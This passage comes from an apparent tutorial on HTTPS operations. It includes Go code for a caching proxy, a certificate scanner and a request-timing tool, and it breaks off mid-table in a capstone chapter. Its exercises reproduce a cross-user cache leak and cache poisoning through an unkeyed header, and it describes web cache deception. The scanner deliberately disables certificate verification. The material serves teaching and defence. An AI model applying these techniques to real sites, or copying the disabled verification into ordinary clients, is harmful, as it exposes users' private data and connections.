	if _, ok := cc["private"]; ok {
		return 0, 0, false // browser may cache it; a CDN must not
	}
	if v, ok := cc["vary"]; ok && v == "*" {
		return 0, 0, false
	}
	secs := func(name string) (time.Duration, bool) {
		v, ok := cc[name]
		if !ok {
			return 0, false
		}
		n, err := strconv.Atoi(v)
		return time.Duration(n) * time.Second, err == nil
	}
	if d, ok := secs("s-maxage"); ok { // s-maxage wins for shared caches
		ttl = d
	} else if d, ok := secs("max-age"); ok {
		ttl = d
	} else {
		return 0, 0, false // no explicit freshness: don't guess
	}
	swr, _ = secs("stale-while-revalidate")
	return ttl, swr, true
}

func (c *cache) serve(w http.ResponseWriter, e *entry, state string) {
	for k, v := range e.header {
		w.Header()[k] = v
	}
	w.Header().Set("Age", strconv.Itoa(int(time.Since(e.stored).Seconds())))
	w.Header().Set("X-Cache", state)
	w.WriteHeader(e.status)
	w.Write(e.body)
}

func (c *cache) forward(w http.ResponseWriter, r *http.Request, state string) {
	req, _ := http.NewRequest(r.Method, c.origin+r.URL.RequestURI(), r.Body)
	req.Header = r.Header.Clone()
	resp, err := c.client.Do(req)
	if err != nil {
		http.Error(w, "origin unreachable", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	for k, v := range resp.Header {
		w.Header()[k] = v
	}
	w.Header().Set("X-Cache", state)
	w.WriteHeader(resp.StatusCode)
	io.Copy(w, resp.Body)
}

// ------------------------------------------------------------------ demo --

func demoOrigin(hits map[string]int, mu *sync.Mutex) http.Handler {
	count := func(r *http.Request) { mu.Lock(); hits[r.URL.Path]++; mu.Unlock() }
	mux := http.NewServeMux()
	mux.HandleFunc("/static.js", func(w http.ResponseWriter, r *http.Request) {
		count(r)
		w.Header().Set("Cache-Control", "public, max-age=2, stale-while-revalidate=5")
		fmt.Fprint(w, "console.log('v1')")
	})
	mux.HandleFunc("/account", func(w http.ResponseWriter, r *http.Request) {
		count(r)
		w.Header().Set("Cache-Control", "private, max-age=60")
		fmt.Fprintf(w, "balance for %s", r.Header.Get("X-User"))
	})
	mux.HandleFunc("/news", func(w http.ResponseWriter, r *http.Request) {
		count(r)
		w.Header().Set("Cache-Control", "public, max-age=1")
		w.Header().Set("ETag", `"news-v7"`)
		if r.Header.Get("If-None-Match") == `"news-v7"` {
			w.WriteHeader(http.StatusNotModified)
			return
		}
		fmt.Fprint(w, strings.Repeat("big news ", 1000))
	})
	mux.HandleFunc("/hello", func(w http.ResponseWriter, r *http.Request) {
		count(r)
		w.Header().Set("Cache-Control", "public, max-age=60")
		w.Header().Set("Vary", "Accept-Language")
		if strings.HasPrefix(r.Header.Get("Accept-Language"), "fr") {
			fmt.Fprint(w, "bonjour")
			return
		}
		fmt.Fprint(w, "hello")
	})
	return mux
}

func main() {
	demo := flag.Bool("demo", false, "run a scripted demo against a built-in origin")
	origin := flag.String("origin", "", "origin base URL")
	listen := flag.String("listen", ":8081", "listen address")
	flag.Parse()
	if !*demo {
		log.Printf("caching %s on %s", *origin, *listen)
		log.Fatal(http.ListenAndServe(*listen, newCache(*origin)))
	}

	hits := map[string]int{}
	var mu sync.Mutex
	o := httptest.NewServer(demoOrigin(hits, &mu))
	defer o.Close()
	edge := httptest.NewServer(newCache(o.URL))
	defer edge.Close()

	get := func(path string, hdr ...string) {
		req, _ := http.NewRequest("GET", edge.URL+path, nil)
		for i := 0; i+1 < len(hdr); i += 2 {
			req.Header.Set(hdr[i], hdr[i+1])
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println(err)
			return
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		mu.Lock()
		n := hits[path]
		mu.Unlock()
		fmt.Printf("GET %-11s %-28s -> %-12s age=%-2s origin hits=%d  body=%q\n", path, strings.Join(hdr, " "),
			resp.Header.Get("X-Cache"), resp.Header.Get("Age"), n, string(bytes.TrimSpace(b[:min(len(b), 20)])))
	}

	get("/static.js")
	get("/static.js")
	time.Sleep(2100 * time.Millisecond)
	get("/static.js") // stale: served instantly, refreshed in the background
	time.Sleep(100 * time.Millisecond)
	get("/static.js")
	get("/account", "X-User", "alice")
	get("/account", "X-User", "bob")
	get("/news")
	time.Sleep(1100 * time.Millisecond)
	get("/news") // stale, no swr: revalidate with If-None-Match -> 304
	get("/hello", "Accept-Language", "en")
	get("/hello", "Accept-Language", "fr")
	get("/hello", "Accept-Language", "fr")
}
```

```text
$ go run ./edgecache -demo
GET /static.js                               -> MISS         age=0  origin hits=1  body="console.log('v1')"
GET /static.js                               -> HIT          age=0  origin hits=1  body="console.log('v1')"
GET /static.js                               -> STALE        age=2  origin hits=1  body="console.log('v1')"
GET /static.js                               -> HIT          age=0  origin hits=2  body="console.log('v1')"
GET /account    X-User alice                 -> UNCACHEABLE  age=0  origin hits=1  body="balance for alice"
GET /account    X-User bob                   -> UNCACHEABLE  age=0  origin hits=2  body="balance for bob"
GET /news                                    -> MISS         age=0  origin hits=1  body="big news big news bi"
GET /news                                    -> REVALIDATED  age=0  origin hits=2  body="big news big news bi"
GET /hello      Accept-Language en           -> MISS         age=0  origin hits=1  body="hello"
GET /hello      Accept-Language fr           -> MISS         age=0  origin hits=2  body="bonjour"
GET /hello      Accept-Language fr           -> HIT          age=0  origin hits=2  body="bonjour"
```

**Read it line by line:**

- **`/static.js`** (`max-age=2, stale-while-revalidate=5`): MISS, then HIT. After
  2 s it's **STALE**: the client gets an instant answer while one background
  refresh runs (origin hits go 1 → 2), and the next request is a fresh HIT.
  Users never wait for the origin.
- **`/account`** (`private`): never stored. Alice and Bob each get their own
  answer. Remove `private` from the origin (leaving `max-age=60`) and run it
  again:

  ```text
  GET /account    X-User alice    -> MISS   origin hits=1  body="balance for alice"
  GET /account    X-User bob      -> HIT    origin hits=1  body="balance for alice"
  ```

  Bob receives **Alice's balance**. That's the real-world bug below,
  reproduced with one missing word.
- **`/news`** (`ETag`, `max-age=1`): once stale, the edge revalidates with
  `If-None-Match` and the origin replies `304`. The 9 KB body crosses the
  network only once.
- **`/hello`** (`Vary: Accept-Language`): English and French get separate cache
  entries. Without `Vary`, the first language cached would be served to
  everyone.

**Exercises:**

1. Remove `private` from `/account`, rerun, and watch the leak. Then fix it two
   ways: in the origin (`private`/`no-store`) and in the cache (never store
   responses to requests carrying a session cookie).
2. Add `stale-if-error`: if the origin returns 5xx or is unreachable, serve the
   stale copy. Kill the origin and check that the site stays up.
3. Add **request collapsing**: when 100 requests miss on the same key at once,
   send *one* request to the origin and share the result. Without it, a
   popular object expiring causes a "thundering herd" on the origin.
4. **Cache poisoning:** add a header the origin reflects into the body
   (`X-Forwarded-Host`, say) but that is *not* in the cache key. Show that one
   request poisons the cached copy for everyone. The fix is to put such headers
   in the key, or strip them at the edge.

### Real-world scenario
An API response includes user-specific recommendations but lacks
`Cache-Control: private` or `no-store`. A CDN caches it by URL and serves one
user's personalized response to another. The bug is not "the CDN is bad"; the
origin failed to define the cache boundary. A related attack, **web cache
deception**, tricks a cache into storing a private page under a static-looking
URL (`/account/profile.css`) that the attacker then fetches. Defend by caching
by **content type and explicit headers**, never by file extension alone.

### Common mistakes
- Caching authenticated responses in shared caches without a deliberate key.
- Using query-string versioning inconsistently instead of content-hashed asset
  filenames.
- Forgetting `Vary`, causing compressed/language-specific responses to be
  reused for the wrong clients.
- Purging CDN cache but leaving browser cache or service-worker cache untouched.
- Reading `no-cache` as "don't cache". It means "revalidate before using".
- No `stale-if-error`, so a brief origin outage becomes a full site outage.

### Check yourself
1. What's the difference between `private`, `no-cache`, and `no-store`?
2. Why does `s-maxage` exist?
3. What does a `304` save, and what does it not save?
4. How can a header that isn't part of the cache key poison a cache?

### Key Takeaways
- Every response needs an explicit caching decision. The default behaviours differ between layers.
- `Vary` and the cache key decide *who* gets a cached response. Most caching incidents are key mistakes.
- `stale-while-revalidate` and `stale-if-error` make caches improve availability, not just speed.

## Chapter 16 — Certificate and domain operations: ACME, rotation, CT monitoring, and emergency revocation

### In one sentence
TLS certificates are an operational system: issuance, renewal, private-key
handling, DNS validation, CT monitoring, revocation, and expiry alerts all need
owners and runbooks.

### Why this matters
Certificate failures are common, highly visible outages. The cryptography may
be sound, but a missed renewal, wrong SAN, broken intermediate chain, CAA
mistake, or stale load-balancer certificate can take a site down instantly.
And lifetimes are shrinking: under a 2025 CA/Browser Forum decision, public
certificates are limited to 200 days from March 2026, 100 days from March 2027,
and **47 days from March 2029**. Manual renewal won't survive that schedule.

### How it actually works

**ACME** (RFC 8555, used by Let's Encrypt and most CAs and cloud certificate
managers) automates issuance:

```
1. Your ACME client asks the CA for a certificate for api.example.com
2. The CA sets a challenge to prove you control the name:
     HTTP-01   serve a token at http://api.example.com/.well-known/acme-challenge/...
     DNS-01    publish a TXT record at _acme-challenge.api.example.com   (needed for wildcards)
     TLS-ALPN-01  answer a special TLS handshake on port 443
3. The CA checks the challenge from several network vantage points
4. The CA issues the certificate and logs it to Certificate Transparency
5. Your client installs it, and must re-run all of this before expiry
```

**CAA records** (`dig CAA example.com`) say which CAs may issue for your
domain. A CA must check them before issuing. They prevent mis-issuance
by other CAs, and they also block *your own* issuance if you switch CAs and
forget to update them.

**Certificate Transparency (CT)**: every publicly trusted certificate must be
logged in public, append-only logs, and browsers reject certificates without
proof of logging. You can therefore **watch for certificates issued for your
domains that you didn't request**: a compromised DNS account, a rogue employee,
a mis-issuing CA.

**Revocation is weak in practice.** Browsers mostly rely on lists that vendors
push to them, not on live OCSP checks, and in 2025 Let's Encrypt stopped
operating OCSP entirely in favour of CRLs. If a private key leaks, revoke
*and* replace the certificate, and treat short lifetimes as the real limit
on damage.

Inspection commands:

```bash
# Inspect the served certificate and chain.
openssl s_client -connect example.com:443 -servername example.com -showcerts </dev/null

# Show expiry, subject, issuer, and SANs from a local cert file.
openssl x509 -in cert.pem -noout -subject -issuer -dates -ext subjectAltName

# Check CAA records.
dig CAA example.com
```

### Build it in Go (40 min) — a certificate inventory scanner

Monitoring the certificate *in the directory* isn't enough. You need to check the
certificate each endpoint **actually serves**. `certcheck` scans many endpoints
concurrently, grades each one, exits non-zero for cron/CI, and can ask
Certificate Transparency what has been issued for a domain:

```go
// certcheck: a certificate inventory scanner. For every endpoint, check the
// certificate actually SERVED: days to expiry, name coverage, chain sent,
// issuer, key type. Optionally list what Certificate Transparency logs know.
//
//	go run ./certcheck -warn 30 example.com github.com expired.badssl.com
//	go run ./certcheck -ct example.com        # also query crt.sh (CT logs)
package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
)

type result struct {
	target string
	lines  []string
	level  int // 0 ok, 1 warn, 2 critical
}

func main() {
	warn := flag.Int("warn", 30, "warn when a certificate expires within this many days")
	crit := flag.Int("crit", 7, "critical within this many days")
	ct := flag.Bool("ct", false, "also list recent certificates from Certificate Transparency (crt.sh)")
	flag.Parse()

	results := make([]result, flag.NArg())
	var wg sync.WaitGroup
	for i, t := range flag.Args() {
		wg.Add(1)
		go func() { defer wg.Done(); results[i] = check(t, *warn, *crit) }()
	}
	wg.Wait()

	worst := 0
	for _, r := range results {
		tag := []string{"OK  ", "WARN", "CRIT"}[r.level]
		fmt.Printf("[%s] %s\n", tag, r.target)
		for _, l := range r.lines {
			fmt.Println("       " + l)
		}
		worst = max(worst, r.level)
	}
	if *ct {
		for _, t := range flag.Args() {
			host, _, _ := strings.Cut(t, ":")
			ctLookup(host)
		}
	}
	os.Exit(worst) // 0/1/2: plugs straight into cron, CI, or Nagios-style monitoring
}

func check(target string, warnDays, critDays int) result {
	r := result{target: target}
	host, port, err := net.SplitHostPort(target)
	if err != nil {
		host, port = target, "443"
	}
	// Verify ourselves AFTER the handshake so we can still report on bad certs.
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp",
		net.JoinHostPort(host, port), &tls.Config{ServerName: host, InsecureSkipVerify: true})
	if err != nil {
		r.level, r.lines = 2, []string{"handshake failed: " + err.Error()}
		return r
	}
	defer conn.Close()
	certs := conn.ConnectionState().PeerCertificates
	leaf := certs[0]
	days := int(time.Until(leaf.NotAfter).Hours() / 24)

	r.lines = append(r.lines, fmt.Sprintf("subject %s, issuer %q", leaf.Subject.CommonName, leaf.Issuer.CommonName))
	r.lines = append(r.lines, fmt.Sprintf("expires %s (%d days), key %s, lifetime %d days",
		leaf.NotAfter.Format("2006-01-02"), days, keyType(leaf),
		int(leaf.NotAfter.Sub(leaf.NotBefore).Hours()/24)))
	switch {
	case days < 0:
		r.level = 2
		r.lines = append(r.lines, "EXPIRED")
	case days < critDays:
		r.level = 2
	case days < warnDays:
		r.level = 1
	}
	if err := leaf.VerifyHostname(host); err != nil {
		r.level = 2
		r.lines = append(r.lines, "NAME NOT COVERED: SANs are "+strings.Join(leaf.DNSNames, ", "))
	}

	// Chain check using only what the server sent. Run this on Linux: on macOS
	// (and Windows) Go asks the OS to verify, and the OS quietly downloads
	// missing intermediates -- hiding exactly the bug we are looking for.
	inter := x509.NewCertPool()
	for _, c := range certs[1:] {
		inter.AddCert(c)
	}
	if _, err := leaf.Verify(x509.VerifyOptions{DNSName: host, Intermediates: inter}); err != nil {
		r.level = max(r.level, 2)
		r.lines = append(r.lines, fmt.Sprintf("chain does not verify with the %d cert(s) sent: %v", len(certs), err))
	}
	return r
}

func keyType(c *x509.Certificate) string {
	switch k := c.PublicKey.(type) {
	case *rsa.PublicKey:
		return fmt.Sprintf("RSA-%d", k.N.BitLen())
	case *ecdsa.PublicKey:
		return "ECDSA-" + k.Curve.Params().Name
	}
	return c.PublicKeyAlgorithm.String()
}

// ctLookup lists certificates that public CT logs recorded for a domain in
// the last 90 days -- including ones YOU didn't request. crt.sh is a free
// community service: be gentle, and expect it to be slow at times.
func ctLookup(domain string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	u := "https://crt.sh/?output=json&exclude=expired&q=" + url.QueryEscape(domain)
	req, _ := http.NewRequestWithContext(ctx, "GET", u, nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("\nCT %s: %v\n", domain, err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK || !strings.Contains(resp.Header.Get("Content-Type"), "json") {
		fmt.Printf("\nCT %s: crt.sh answered %s (it is often overloaded; try again later)\n", domain, resp.Status)
		return
	}
	var rows []struct {
		IssuerName string `json:"issuer_name"`
		NameValue  string `json:"name_value"`
		NotBefore  string `json:"not_before"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&rows); err != nil {
		fmt.Printf("\nCT %s: %v\n", domain, err)
		return
	}
	issuers := map[string]int{}
	cutoff := time.Now().AddDate(0, 0, -90).Format("2006-01-02")
	recent := 0
	for _, r := range rows {
		if r.NotBefore >= cutoff {
			recent++
			issuers[r.IssuerName]++
		}
	}
	fmt.Printf("\nCT %s: %d unexpired certificates logged, %d issued in the last 90 days, by:\n", domain, len(rows), recent)
	names := make([]string, 0, len(issuers))
	for n := range issuers {
		names = append(names, n)
	}
	sort.Slice(names, func(i, j int) bool { return issuers[names[i]] > issuers[names[j]] })
	for _, n := range names {
		fmt.Printf("  %4d  %s\n", issuers[n], n)
	}
	fmt.Println("  -> any issuer here that you don't use is worth investigating (and a CAA record would block it)")
}
```

Real output, run on Linux:

```text
$ go run ./certcheck -warn 30 example.com github.com expired.badssl.com wrong.host.badssl.com incomplete-chain.badssl.com
[OK  ] example.com
       subject example.com, issuer "Cloudflare TLS Issuing ECC CA 3"
       expires 2026-12-25 (83 days), key ECDSA-P-256, lifetime 90 days
[OK  ] github.com
       subject github.com, issuer "Sectigo Public Server Authentication CA DV E36"
       expires 2026-11-29 (57 days), key ECDSA-P-256, lifetime 89 days
[CRIT] expired.badssl.com
       subject *.badssl.com, issuer "COMODO RSA Domain Validation Secure Server CA"
       expires 2015-04-12 (-4191 days), key RSA-2048, lifetime 3 days
       EXPIRED
       chain does not verify with the 3 cert(s) sent: x509: certificate has expired or is not yet valid: ...
[CRIT] wrong.host.badssl.com
       subject *.badssl.com, issuer "YR1"
       expires 2026-12-28 (86 days), key RSA-2048, lifetime 89 days
       NAME NOT COVERED: SANs are *.badssl.com, badssl.com
       chain does not verify with the 3 cert(s) sent: x509: certificate is valid for *.badssl.com, badssl.com, not wrong.host.badssl.com
[CRIT] incomplete-chain.badssl.com
       subject *.badssl.com, issuer "YR1"
       expires 2026-12-28 (86 days), key RSA-2048, lifetime 89 days
       chain does not verify with the 1 cert(s) sent: x509: certificate signed by unknown authority
exit status 2
```

**What to notice:**

- **`InsecureSkipVerify: true` is deliberate here, and only here.** The scanner
  must complete the handshake to *report on* a bad certificate, and then it
  verifies explicitly with `VerifyHostname` and `Verify`. Never copy that flag
  into a client that sends data.
- **The incomplete-chain check passed on macOS and failed on Linux.** On macOS
  (and Windows), Go asks the operating system to verify certificates, and the
  OS silently downloads the missing intermediate. Linux clients, many
  containers, Java, and Python don't. Run chain checks from the kind of
  client your users have, or at least from Linux.
- **Look at the lifetimes:** 89–90 days for both real sites. The industry is
  already most of the way to short-lived certificates.
- **The exit code** (0 OK, 1 warn, 2 critical) makes it a monitoring plugin
  with no extra code.
- **`-ct`** queries crt.sh, a free community CT search engine. It's frequently
  overloaded (it returned 502 during testing), which is why the code checks the
  status and content type before parsing. For production monitoring, use a
  CT monitoring service or run your own log watcher.

**Exercises:**

1. Put every hostname your organisation serves into a file and run `certcheck`
   daily from cron, alerting on exit code ≥ 1. You now have the inventory this
   chapter asks for.
2. Add a check that the key type and size meet your policy (e.g. reject
   RSA-1024) and that the certificate isn't valid for more than 398 days.
3. Add a `CAA` check by extending the TCP/IP guide's
   [`dnsquery` lab](../networking/tcp-ip/real-life-guide-v1.md#chapter-18-dns-turning-names-into-addresses) to query type 257, and warn if
   the issuing CA isn't listed.

Operational checklist:

```
[ ] Automated renewal tested, not merely configured.
[ ] Expiry alert fires well before the shortest certificate lifetime.
[ ] Private keys are generated and stored in approved systems.
[ ] Intermediate chain is served correctly from every edge.
[ ] CT logs are monitored for unexpected certificates.
[ ] CAA records match the CAs you actually use.
[ ] Emergency revocation and reissue runbook exists.
```

### Real-world scenario
A company rotates from one CDN to another, updates DNS, and forgets that the new
edge lacks the wildcard certificate for a legacy subdomain. Only users hitting
that subdomain fail, and the main site is fine. The fix is certificate inventory:
domains, SANs, edges, owners, renewal mechanism, and expiry. That's exactly
the list `certcheck` takes as input.

### Common mistakes
- Monitoring only the origin certificate while the public edge serves a
  different certificate.
- Treating wildcard certificates as a substitute for domain inventory.
- Forgetting that CAA changes can block future issuance.
- Assuming revocation alone immediately protects all users; client revocation
  behavior varies.
- Testing chain completeness only from a browser or a Mac.

### Check yourself
1. Why does a wildcard certificate require the DNS-01 challenge?
2. What two different problems do CAA records and CT monitoring solve?
3. Why did the incomplete chain pass on macOS but fail on Linux?
4. What changes for your team when certificates last 47 days?

### Key Takeaways
- Automate issuance *and* deployment, and monitor the certificate that is actually served.
- CAA restricts who may issue. CT tells you who did.
- Short lifetimes, not revocation, are the real limit on how long a leaked key is useful.

**Across the series:** zero-downtime rotation with Go's `GetCertificate`, and a
chain-failure fingerprint table, are in the
[TCP/IP guide's Chapter 56](../networking/tcp-ip/real-life-guide-v1.md#chapter-56-tls-and-certificate-operations-expiry-chains-sni-rotation).

## Chapter 17 — Debugging the lifecycle: browser DevTools, curl, OpenSSL, packet capture, and logs

### In one sentence
Debugging HTTPS means locating the failing layer first, then using the least
powerful tool that can prove or disprove your hypothesis.

### Why this matters
The same symptom ("page is slow" or "site is down") can come from DNS, TCP,
TLS, HTTP routing, cache, CDN, browser rendering, service-worker behavior,
backend latency, or security policy. Guessing wastes incident time. A
request is a sequence of phases, and each phase has a tool that can time it.

### How it actually works

**1. Time the phases.** Every HTTPS request has the same timeline:

```
 start ── DNS ── TCP connect ── TLS handshake ── request sent ── first byte ── last byte
          └ resolver ┘ └ 1 RTT ┘    └ 1 RTT (TLS 1.3) ┘     └ server think + 1 RTT ┘ └ size/bandwidth ┘
```

A slow phase tells you which team or system to look at. That's the whole
method.

**2. Use a ladder of tools, cheapest first:**

```bash
# DNS
dig example.com A
dig example.com AAAA

# TCP/TLS/HTTP timing
curl -v -w 'dns=%{time_namelookup} connect=%{time_connect} tls=%{time_appconnect} ttfb=%{time_starttransfer} total=%{time_total}\n' -o /dev/null https://example.com

# Certificate
openssl s_client -connect example.com:443 -servername example.com </dev/null

# Headers and cache/security policy
curl -sI https://example.com

# Bypass DNS and hit ONE specific edge or backend, keeping SNI and Host correct
curl -v --resolve example.com:443:203.0.113.10 https://example.com/
```

`curl -w` values are **cumulative**: subtract consecutive ones to get each phase.

**3. Know what each vantage point can see:**

| Tool | Sees | Can't see |
|---|---|---|
| Browser DevTools | Service workers, CORS, cache mode, priorities, render blocking, main-thread tasks, layout shifts | What happened after the edge |
| `curl` / `httptrace` | Exact phase timings, raw headers, protocol, connection reuse | Browser policy (CORS, CSP, cookies' SameSite) |
| CDN / LB logs | Which POP, cache status, upstream timing, the status the *edge* returned | The browser's experience |
| App logs and traces | What the backend saw after proxy rewriting, and its own latency | Anything that never reached it |
| Packet capture | Ground truth on the wire: loss, retransmits, resets, timing | Content inside TLS (without key logs) |

### Build it in Go (30 min) — `curl -w` you can extend

Go's `net/http/httptrace` package calls you back at every phase of a request.
`httptrace` turns those callbacks into a timing breakdown, and then prints the
response headers that reveal the path (CDN, cache, protocol upgrades). With
`-n` it sends several requests on one client, so you can watch connection
reuse:

```go
// httptrace: `curl -w` in Go -- time every phase of an HTTPS request and show
// what the response says about caches, servers, and protocols on the way.
//
//	go run ./httptrace https://example.com/
//	go run ./httptrace -n 3 https://www.cloudflare.com/     # watch connection reuse
package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/http/httptrace"
	"os"
	"strings"
	"time"
)

func main() {
	n := flag.Int("n", 1, "number of sequential requests (shows connection reuse)")
	flag.Parse()
	if flag.NArg() != 1 {
		fmt.Println("usage: httptrace [-n N] URL")
		os.Exit(2)
	}
	client := &http.Client{Timeout: 15 * time.Second} // one client = one connection pool
	for i := 1; i <= *n; i++ {
		if err := trace(client, flag.Arg(0), i); err != nil {
			fmt.Println("error:", err)
			os.Exit(1)
		}
	}
}

func trace(client *http.Client, url string, i int) error {
	var start, dnsStart, dnsDone, connStart, connDone, tlsStart, tlsDone, gotConn, wrote, firstByte time.Time
	var reused bool
	var remote string
	var tlsState *tls.ConnectionState

	ct := &httptrace.ClientTrace{
		DNSStart:          func(httptrace.DNSStartInfo) { dnsStart = time.Now() },
		DNSDone:           func(httptrace.DNSDoneInfo) { dnsDone = time.Now() },
		ConnectStart:      func(_, _ string) { connStart = time.Now() },
		ConnectDone:       func(_, addr string, _ error) { connDone, remote = time.Now(), addr },
		TLSHandshakeStart: func() { tlsStart = time.Now() },
		TLSHandshakeDone: func(s tls.ConnectionState, _ error) {
			tlsDone, tlsState = time.Now(), &s
		},
		GotConn: func(info httptrace.GotConnInfo) {
			gotConn, reused = time.Now(), info.Reused
			if remote == "" {
				remote = info.Conn.RemoteAddr().String()
			}
		},
		WroteRequest:         func(httptrace.WroteRequestInfo) { wrote = time.Now() },
		GotFirstResponseByte: func() { firstByte = time.Now() },
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	req = req.WithContext(httptrace.WithClientTrace(req.Context(), ct))

	start = time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	body, _ := io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	end := time.Now()

	ms := func(a, b time.Time) string {
		if a.IsZero() || b.IsZero() {
			return "     -   "
		}
		return fmt.Sprintf("%7.1fms", float64(b.Sub(a).Microseconds())/1000)
	}
	fmt.Printf("request #%d  %s  %s  reused=%v  remote=%s\n", i, resp.Proto, resp.Status, reused, remote)
	fmt.Printf("  dns       %s\n", ms(dnsStart, dnsDone))
	fmt.Printf("  tcp       %s\n", ms(connStart, connDone))
	fmt.Printf("  tls       %s", ms(tlsStart, tlsDone))
	if tlsState != nil {
		fmt.Printf("   %s, ALPN=%q, resumed=%v", tls.VersionName(tlsState.Version), tlsState.NegotiatedProtocol, tlsState.DidResume)
	}
	fmt.Println()
	fmt.Printf("  got conn  %s  (time to a usable connection)\n", ms(start, gotConn))
	fmt.Printf("  ttfb      %s  (request written -> first byte: server think time + 1 RTT)\n", ms(wrote, firstByte))
	fmt.Printf("  download  %s  (%d bytes)\n", ms(firstByte, end), body)
	fmt.Printf("  total     %s\n", ms(start, end))

	// What the headers reveal about the path.
	for _, h := range []string{"Server", "Via", "Age", "Cache-Control", "CF-Cache-Status", "X-Cache",
		"Alt-Svc", "Strict-Transport-Security", "Server-Timing", "Content-Encoding"} {
		if v := resp.Header.Get(h); v != "" {
			fmt.Printf("  %-26s %s\n", h+":", strings.TrimSpace(v))
		}
	}
	fmt.Println()
	return nil
}
```

```text
$ go run ./httptrace -n 2 https://example.com/
request #1  HTTP/2.0  200 OK  reused=false  remote=104.20.23.154:443
  dns          30.2ms
  tcp          19.5ms
  tls        1108.8ms   TLS 1.3, ALPN="h2", resumed=false
  got conn   1159.5ms  (time to a usable connection)
  ttfb         63.5ms  (request written -> first byte: server think time + 1 RTT)
  download      0.1ms  (577 bytes)
  total      1223.3ms
  Server:                    cloudflare
  Age:                       1345
  CF-Cache-Status:           HIT
  Alt-Svc:                   h3=":443"; ma=86400

request #2  HTTP/2.0  200 OK  reused=true  remote=104.20.23.154:443
  dns            -
  tcp            -
  tls            -
  got conn      0.0ms  (time to a usable connection)
  ttfb         53.2ms  (request written -> first byte: server think time + 1 RTT)
  total        53.6ms
```

**Read it like an incident responder:**

- **The TLS phase took 1,109 ms while TCP took 19.5 ms.** One RTT was about 20 ms,
  so a TLS 1.3 handshake should take about 20 ms too. Something stalled: packet
  loss during the handshake, a busy TLS terminator, or a retransmitted large
  certificate flight. Run it again. If it's consistent, capture packets; if
  it's rare, it's a tail-latency problem worth graphing.
- **Request #2 skipped DNS, TCP, and TLS entirely** (`reused=true`) and finished
  in 54 ms instead of 1,223 ms. Connection reuse is the cheapest performance
  fix there is.
- **`CF-Cache-Status: HIT` with `Age: 1345`**: the CDN answered from a copy
  about 22 minutes old, so the 63 ms TTFB never touched the origin.
- **`ttfb` ≈ server time + 1 RTT.** Subtract the TCP time (≈1 RTT) from TTFB to
  estimate how long the server or edge spent thinking.

**Exercises:**

1. Point it at your own service and at the same service through your CDN.
   Which phases move?
2. Add `-resolve host:ip` (use a custom `DialContext`, as the TCP/IP guide's
   `tcpinfo` lab does) to test one specific backend or POP.
3. Print the `Server-Timing` header if present, and add it to your own
   service: `Server-Timing: db;dur=53, render;dur=12`. It shows up in
   browser DevTools too.
4. Run `-n 20` and print p50/p99 of each phase. One slow handshake in 20 is
   a finding.

### Real-world scenario
`curl` works but the browser fails. That often means the network path is fine
and the issue is browser-enforced: CORS, mixed content, CSP, cookie `SameSite`,
service worker cache, or a blocked third-party script. The fix starts in the
DevTools Console and Network panel, not in packet capture.

The opposite also happens. DevTools shows a request "stalled" for 300 ms with
no server time. That's time waiting *in the browser* for a connection slot
(HTTP/1.1 allows about 6 per host) or behind a higher-priority request.
`httptrace` from the same network will show the server is fast.

### Common mistakes
- Starting with packet capture before checking DNS, headers, and DevTools.
- Testing without the same hostname, protocol version, geography, cookies, and
  headers as affected users.
- Ignoring cache state. "Works in incognito" is evidence, not magic.
- Reading cumulative `curl -w` numbers as per-phase durations.
- Measuring once. Latency is a distribution, and incidents hide in the tail.

### Check yourself
1. In the output above, how would you estimate the RTT, and what does that say
   about the 1.1 s TLS phase?
2. Which tool would you use to prove a CORS failure, and why can't `curl` show it?
3. What does `--resolve` let you test that changing `/etc/hosts` makes harder?

### Key Takeaways
- Time the phases first. The slow phase names the layer.
- Pick the vantage point that can see the failure: browser, edge, backend, or wire.
- Connection reuse removes three of the phases entirely.

**Across the series:** [OSI guide, Part 14](../networking/real-life-example-osi.md#part-14-debugging-by-layer-the-incident-playbook) maps the same
`curl -w` phases onto layers. [TCP/IP guide, Chapter 34](../networking/tcp-ip/real-life-guide-v1.md#chapter-34-a-troubleshooting-method-that-works)
has the `netcheck` ladder for "is anything reachable at all?", and
[Chapter 32](../networking/tcp-ip/real-life-guide-v1.md#chapter-32-wireshark-reading-a-conversation) teaches packet-capture reading with a pcap
decoder written in Go.

## Chapter 18 — Capstone: diagnose a slow, broken, or unsafe HTTPS request end to end

### In one sentence
An expert can take one URL and produce a layered diagnosis: DNS, routing,
transport, TLS, HTTP semantics, cache behavior, browser rendering, security
policy, and user-visible impact.

### Scenario
Users in one region report that `https://www.example.com/app` is slow and
occasionally shows an old UI after deployment. Security also reports that a new
subdomain is missing expected headers.

### Investigation plan

```
1. Scope:
   affected region, browser, network, time window, URL, account type

2. DNS/routing:
   A/AAAA answers, resolver differences, CDN POP, anycast path

3. Transport/protocol:
   TCP vs QUIC, HTTP/2 vs HTTP/3, packet loss, fallback behavior

4. TLS:
   certificate SAN, chain, expiry, SNI, ALPN, edge certificate inventory

5. HTTP:
   status, redirects, cache headers, Vary, cookies, compression, content type

6. CDN/cache:
   hit/miss, age, surrogate key, purge status, service-worker cache

7. Browser:
   LCP, CLS, INP, render-blocking resources, main-thread long tasks

8. Security:
   HSTS, CSP, CORS, cookie flags, frame policy, referrer policy

9. Fix:
   smallest safe change, rollback path, validation, monitoring, postmortem
```

### The toolbox you've built

Every step in the plan has a tool from this series:

| Step | Command | From |
|---|---|---|
